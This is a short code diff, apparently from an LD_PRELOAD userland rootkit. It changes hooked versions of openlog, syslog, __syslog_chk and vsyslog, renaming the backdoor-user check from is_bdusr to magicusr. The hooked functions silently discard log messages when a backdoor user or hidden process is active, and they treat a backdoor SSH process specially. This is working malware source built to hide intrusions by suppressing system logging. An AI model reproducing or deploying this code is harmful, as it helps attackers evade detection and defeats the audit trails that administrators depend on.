@@ -1,12 +1,12 @@
 void openlog(const char *ident, int option, int facility){
-    if(is_bdusr() || hidden_ppid()) return;
+    if(magicusr() || hidden_ppid()) return;
     hook(COPENLOG);
     call(COPENLOG, ident, option, facility);
     return;
 }
 
 void syslog(int priority, const char *format, ...){
-    if(is_bdusr() || hidden_ppid()) return;
+    if(magicusr() || hidden_ppid()) return;
 
     if(bd_sshproc()){
         hook(CSETGID);
@@ -22,7 +22,7 @@ void syslog(int priority, const char *format, ...){
 }
 
 void __syslog_chk(int priority, int flag, const char *format, ...){
-    if(is_bdusr() || hidden_ppid()) return;
+    if(magicusr() || hidden_ppid()) return;
 
     if(bd_sshproc()){
         hook(CSETGID);
@@ -38,7 +38,7 @@ void __syslog_chk(int priority, int flag, const char *format, ...){
 }
 
 void vsyslog(int priority, const char *format, va_list ap){
-    if(is_bdusr() || hidden_ppid()) return;
+    if(magicusr() || hidden_ppid()) return;
 
     if(bd_sshproc()){
         hook(CSETGID);
